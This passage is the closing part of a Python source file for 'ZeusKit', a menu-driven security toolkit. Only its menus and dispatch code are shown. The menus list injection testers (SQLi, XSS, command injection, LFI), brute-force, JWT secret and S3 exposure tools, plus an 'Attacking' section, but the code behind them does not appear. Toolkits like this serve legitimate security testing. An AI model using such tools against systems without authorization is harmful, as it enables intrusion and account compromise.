        print(" [6] Secure Vault Note Encrypter")
        print(" [7] Local ARP Cache Viewer")
        print(" [8] Password Strength Analyzer")
        print(" [9] Disk Storage Usage (df)")
        print("[10] Active Processes (ps)")
        print(" [0] Back to Main Menu")
        
        c = input(Fore.YELLOW + "Other > Selection: ").strip()
        if c == "1": tool_41_system_info()
        elif c == "2": tool_42_ping_sweep()
        elif c == "3": tool_43_banner_grab()
        elif c == "4": tool_44_tcp_latency()
        elif c == "5": tool_45_http_status()
        elif c == "6": tool_46_secure_vault()
        elif c == "7": tool_47_arp_cache()
        elif c == "8": tool_48_password_strength()
        elif c == "9": tool_49_disk_space()
        elif c == "10": tool_50_process_list()
        elif c == "0": break
        input(Fore.YELLOW + "\nPress Enter to continue...")

def menu_testing():
    while True:
        print(Fore.CYAN + "\n=== [6] VULNERABILITY & INJECTION TEST TOOLS 🧪 ===")
        print(" [1] Simulated SQLi Response Analyzer")
        print(" [2] Simulated XSS Reflection Tester")
        print(" [3] Command Injection Payload Tester")
        print(" [4] HTTP Brute-Force Rate Limit / Throttling Tester")
        print(" [5] Path Traversal / LFI Test Simulator")
        print(" [6] Sensitive Backup & Config File Scanner")
        print(" [0] Back to Main Menu")
        
        c = input(Fore.YELLOW + "Testing Tools > Selection: ").strip()
        if c == "1": tool_51_sqli_test_simulator()
        elif c == "2": tool_52_xss_test_simulator()
        elif c == "3": tool_53_cmd_injection_tester()
        elif c == "4": tool_54_rate_limit_test()
        elif c == "5": tool_55_lfi_test_simulator()
        elif c == "6": tool_56_sensitive_file_scanner()
        elif c == "0": break
        input(Fore.YELLOW + "\nPress Enter to continue...")

def menu_cloud_api():
    while True:
        print(Fore.CYAN + "\n=== [7] CLOUD, API & MOBILE SECURITY SUITE ☁️ ===")
        print(" [1] S3 Bucket Public Exposure Checker")
        print(" [2] CORS Policy Misconfiguration Tester")
        print(" [3] JWT Secret / Algorithm Tester")
        print(" [4] API Endpoint Health & Latency Monitor")
        print(" [5] Termux Local Environment Auditor")
        print(" [6] Local SQLite Database Inspector")
        print(" [0] Back to Main Menu")
        
        c = input(Fore.YELLOW + "Cloud/API > Selection: ").strip()
        if c == "1": tool_57_s3_bucket_checker()
        elif c == "2": tool_58_cors_misconfig_tester()
        elif c == "3": tool_59_jwt_secret_tester()
        elif c == "4": tool_60_api_health_monitor()
        elif c == "5": tool_61_termux_env_auditor()
        elif c == "6": tool_62_local_sqlite_inspector()
        elif c == "0": break
        input(Fore.YELLOW + "\nPress Enter to continue...")

def main():
    while True:
        banner()
        print(Fore.CYAN + f"=== ZEUSKIT v0.8.0 - MAIN MENU ({TOTAL_TOOLS} TOOLS LOADED) ===")
        print(" [1] 🌐 Reconnaissance & Network Tools        (14 Tools)")
        print(" [2] 🔐 Code, Decode & Cryptography Section (12 Tools)")
        print(" [3] 🔍 Web Analysis & OSINT Suite          ( 7 Tools)")
        print(" [4] ⚡ Attacking & Brute-Force Section       ( 7 Tools)")
        print(" [5] 🛠️ System Diagnostics & Utilities        (10 Tools)")
        print(" [6] 🧪 Vulnerability & Injection Test Tools  ( 6 Tools)")
        print(" [7] ☁️ Cloud, API & Mobile Security Suite    ( 6 Tools)")
        print("[67] Check for GitHub Updates")
        print(" [0] Exit ZeusKit")
        print("--------------------------------------------------------------------")
        
        choice = input(Fore.YELLOW + "ZeusKit > Main Menu: ").strip()
        
        if choice == "1": menu_recon()
        elif choice == "2": menu_code_decode()
        elif choice == "3": menu_web_osint()
        elif choice == "4": menu_attacking()
        elif choice == "5": menu_other()
        elif choice == "6": menu_testing()
        elif choice == "7": menu_cloud_api()
        elif choice == "67": check_for_updates()
        elif choice == "0":
            print(Fore.CYAN + "[+] Exiting ZeusKit. Stay secure!")
            break
        else:
            print(Fore.RED + "[!] Invalid selection. Choose 1-7 or 67.")

if __name__ == "__main__":
    main()
